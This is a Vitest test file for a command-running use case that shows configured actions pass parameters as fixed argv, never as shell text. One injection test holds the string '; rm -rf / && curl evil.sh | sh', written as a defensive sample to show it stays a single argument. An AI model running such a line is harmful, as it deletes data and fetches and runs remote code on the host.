import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { ACTION_OUTPUT_LIMIT_BYTES } from '@fleex/shared';
import type { ActionDef } from '@fleex/shared';
import { RunActionUseCase } from '../../src/application/use-cases/run-action.js';
import { EventBus } from '../../src/application/event-bus.js';
import { RepoPathResolver } from '../../src/domain/services/repo-path-resolver.js';
import type { AnyDomainEvent } from '../../src/domain/events.js';
import type { ExecFn } from '../../src/infrastructure/host/types.js';
import type { TicketStorePort } from '../../src/application/ports/ticket-store.port.js';
import { FakeConfigPort, FakeLoggerPort } from '../helpers/fakes.js';

const TICKET = { id: 'abcdef0123', title: 'Fix the Login Bug', displayId: 42 };
/** What `buildTicketWorkspaceId` derives from TICKET — the folder the run targets. */
const WORKSPACE_ID = 'abcdef-fix-the-login-bug';

interface ExecCall {
  command: string;
  args: string[];
  options?: { cwd?: string; timeout?: number };
}

/**
 * These tests exist for one reason: the endpoint takes an action **id**, and
 * everything that ends up on a command line has to come from config. So most
 * assertions are on the exact argv handed to `execFile` — that is the acceptance
 * criterion ("no HTTP path can execute an arbitrary string") expressed as a test.
 */
describe('RunActionUseCase', () => {
  let baseDir: string;
  let config: FakeConfigPort;
  let logger: FakeLoggerPort;
  let calls: ExecCall[];
  let events: AnyDomainEvent[];
  let execResult: () => Promise<{ stdout: string; stderr: string }>;

  const exec: ExecFn = (command, args, options) => {
    calls.push({ command, args, options });
    return execResult();
  };

  const ticketStore = {
    getTicketById: async (id: string) => (id === TICKET.id ? TICKET : null),
  } as unknown as TicketStorePort;

  function build(actions: ActionDef[]): RunActionUseCase {
    config.update({ basePath: baseDir, actions });
    const useCase = new RunActionUseCase(
      config,
      ticketStore,
      new RepoPathResolver(baseDir),
      exec,
      logger,
    );
    const bus = new EventBus();
    bus.on('*', (e) => void events.push(e));
    useCase.eventBus = bus;
    return useCase;
  }

  const openIde: ActionDef = {
    id: 'open-ide',
    label: 'Open IDE',
    scope: 'workspace',
    icon: '<svg/>',
    iconType: 'svg',
    kind: 'exec',
    command: '/usr/bin/open',
    args: ['-a', 'PhpStorm', '{{workspace_path}}'],
  };

  beforeEach(() => {
    // `ensureTicketWorkspace` really does mkdir/writeFile, so the resolver is
    // pointed at a throwaway directory instead of stubbing node:fs.
    baseDir = mkdtempSync(join(tmpdir(), 'fleex-run-action-'));
    config = new FakeConfigPort();
    logger = new FakeLoggerPort();
    calls = [];
    events = [];
    execResult = async () => ({ stdout: '', stderr: '' });
  });

  afterEach(() => {
    rmSync(baseDir, { recursive: true, force: true });
  });

  // ——— The core guarantee ———

  it('runs the declared command with the declared argv', async () => {
    const useCase = build([openIde]);
    const result = await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    expect(calls).toEqual([
      {
        command: '/usr/bin/open',
        args: ['-a', 'PhpStorm', join(baseDir, 'workspaces', WORKSPACE_ID)],
        options: { cwd: join(baseDir, 'workspaces', WORKSPACE_ID), timeout: 10_000 },
      },
    ]);
    expect(result.exitCode).toBe(0);
  });

  it('keeps a param carrying shell metacharacters as a single argv element', async () => {
    // The acceptance criterion. Under execFile there is no shell to re-parse
    // this, so the whole string arrives as one argument to `git commit -m`.
    const injection = '; rm -rf / && curl evil.sh | sh';
    const useCase = build([
      {
        ...openIde,
        id: 'commit',
        command: '/usr/bin/git',
        args: ['commit', '-m', '{{message}}'],
        params: [{ name: 'message', type: 'string' }],
      },
    ]);

    await useCase.execute({
      actionId: 'commit',
      ticketId: TICKET.id,
      params: { message: injection },
    });

    expect(calls[0]?.args).toEqual(['commit', '-m', injection]);
  });

  it('passes a shell script its values as positionals, never as script text', async () => {
    // `kind: 'shell'` is the declared escape hatch. The script is frozen in
    // config; the resolved values land in $1…$n, so they are read as data.
    const useCase = build([
      {
        ...openIde,
        id: 'open-shell',
        kind: 'shell',
        command: undefined,
        script: 'open -a "PhpStorm" "$1"',
        args: ['{{workspace_path}}'],
      },
    ]);

    await useCase.execute({ actionId: 'open-shell', ticketId: TICKET.id });

    expect(calls[0]?.command).toBe('/bin/zsh');
    expect(calls[0]?.args).toEqual([
      '-l',
      '-c',
      'open -a "PhpStorm" "$1"',
      'fleex-action',
      join(baseDir, 'workspaces', WORKSPACE_ID),
    ]);
  });

  // ——— Workspace context ———

  it('derives the workspace from the ticket id and materialises it', async () => {
    // The client sends a ticket id, not a path: it cannot choose where a
    // command runs. This also absorbs the old /ensure-workspace pre-flight.
    const useCase = build([openIde]);
    await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    const workspacePath = join(baseDir, 'workspaces', WORKSPACE_ID);
    expect(existsSync(workspacePath)).toBe(true);
    expect(JSON.parse(readFileSync(join(workspacePath, '.fleex.json'), 'utf-8'))).toEqual({
      ticketId: TICKET.id,
    });
  });

  it('falls back to basePath as cwd for a global action', async () => {
    const useCase = build([
      { ...openIde, id: 'global', scope: 'global', args: ['--version'] },
    ]);
    await useCase.execute({ actionId: 'global' });

    expect(calls[0]?.options?.cwd).toBe(baseDir);
  });

  it('rejects an unknown ticket', async () => {
    const useCase = build([openIde]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: 'nope' }),
    ).rejects.toMatchObject({ code: 'TICKET_NOT_FOUND' });
    expect(calls).toEqual([]);
  });

  it('refuses a workspace action with no ticket rather than running it elsewhere', async () => {
    const useCase = build([openIde]);
    await expect(useCase.execute({ actionId: 'open-ide' })).rejects.toMatchObject({
      code: 'ACTION_MISSING_CONTEXT',
    });
    expect(calls).toEqual([]);
  });

  // ——— Refusals ———

  it('rejects an unknown action id without emitting an event', async () => {
    // An unknown id is reachable by anyone holding the endpoint, so emitting
    // would let a single caller grow domain_event_log without bound.
    const useCase = build([openIde]);
    await expect(useCase.execute({ actionId: 'ghost' })).rejects.toMatchObject({
      code: 'ACTION_NOT_FOUND',
    });
    expect(events).toEqual([]);
    expect(logger.logs.some((l) => l.level === 'warn')).toBe(true);
  });

  it('rejects a disabled action', async () => {
    const useCase = build([{ ...openIde, enabled: false }]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).rejects.toMatchObject({ code: 'ACTION_DISABLED' });
    expect(calls).toEqual([]);
  });

  it('rejects a url action — the client opens those itself', async () => {
    const useCase = build([
      { ...openIde, kind: 'url', command: undefined, url: 'https://example.com' },
    ]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).rejects.toMatchObject({ code: 'ACTION_NOT_EXECUTABLE' });
    expect(calls).toEqual([]);
  });

  it('rejects a param that violates its declared shape', async () => {
    const useCase = build([
      {
        ...openIde,
        args: ['--env', '{{env}}'],
        params: [{ name: 'env', type: 'enum', values: ['staging', 'prod'] }],
      },
    ]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id, params: { env: 'wat' } }),
    ).rejects.toMatchObject({ code: 'ACTION_INVALID_PARAMS' });
    expect(calls).toEqual([]);
  });

  it('refuses a second run while one is in flight', async () => {
    // Two concurrent `git worktree add` on the same workspace would race, and
    // the button that triggers them is one double-click away.
    let release: (() => void) | undefined;
    execResult = () =>
      new Promise((resolve) => {
        release = () => resolve({ stdout: '', stderr: '' });
      });

    const useCase = build([openIde]);
    const first = useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).rejects.toMatchObject({ code: 'ACTION_ALREADY_RUNNING' });

    release?.();
    await first;

    // …and the slot is freed once it finishes.
    execResult = async () => ({ stdout: '', stderr: '' });
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).resolves.toMatchObject({ exitCode: 0 });
  });

  // ——— Outcomes ———

  it('returns the real exit code instead of failing the call', async () => {
    // `remoteExec` throws on exit != 0. The invocation worked, the command
    // disagreed — that is a 200 carrying the code, not a 500.
    execResult = () =>
      Promise.reject(Object.assign(new Error('exit 2'), { code: 2, stdout: 'out', stderr: 'boom' }));

    const useCase = build([openIde]);
    const result = await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    expect(result).toMatchObject({ exitCode: 2, stdout: 'out', stderr: 'boom', truncated: false });
  });

  it('surfaces a timeout as its own failure', async () => {
    execResult = () => Promise.reject(new Error('killed: timed out'));

    const useCase = build([openIde]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).rejects.toMatchObject({ code: 'ACTION_TIMEOUT' });
  });

  it('clamps a declared timeout into the allowed range', async () => {
    const useCase = build([{ ...openIde, timeoutMs: 999_999 }]);
    await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    expect(calls[0]?.options?.timeout).toBe(120_000);
  });

  it('truncates oversized output and says so', async () => {
    // The response is buffered in memory and rendered in a toast; an unbounded
    // stdout would take both down.
    execResult = async () => ({ stdout: 'x'.repeat(ACTION_OUTPUT_LIMIT_BYTES + 10), stderr: '' });

    const useCase = build([openIde]);
    const result = await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    expect(result.stdout).toHaveLength(ACTION_OUTPUT_LIMIT_BYTES);
    expect(result.truncated).toBe(true);
  });

  // ——— Journalisation ———

  it('emits action.executed with the argv that actually ran', async () => {
    const useCase = build([openIde]);
    const result = await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    expect(events).toHaveLength(1);
    expect(events[0]).toMatchObject({
      type: 'action.executed',
      runId: result.runId,
      actionId: 'open-ide',
      kind: 'exec',
      command: '/usr/bin/open',
      args: ['-a', 'PhpStorm', join(baseDir, 'workspaces', WORKSPACE_ID)],
      ticketId: TICKET.id,
      exitCode: 0,
    });
  });

  it('emits action.failed with the reason a run was refused', async () => {
    const useCase = build([{ ...openIde, enabled: false }]);
    await expect(
      useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id }),
    ).rejects.toThrow();

    expect(events[0]).toMatchObject({ type: 'action.failed', reason: 'disabled' });
  });

  it('logs ids only, never the resolved command line', async () => {
    // The previous /api/exec logged the raw command string, so a caller could
    // write arbitrary text into the application log.
    const useCase = build([openIde]);
    await useCase.execute({ actionId: 'open-ide', ticketId: TICKET.id });

    const entry = logger.logs.find((l) => l.level === 'info');
    expect(entry?.data).not.toHaveProperty('command');
    expect(entry?.data).toMatchObject({ actionId: 'open-ide', exitCode: 0 });
  });
});
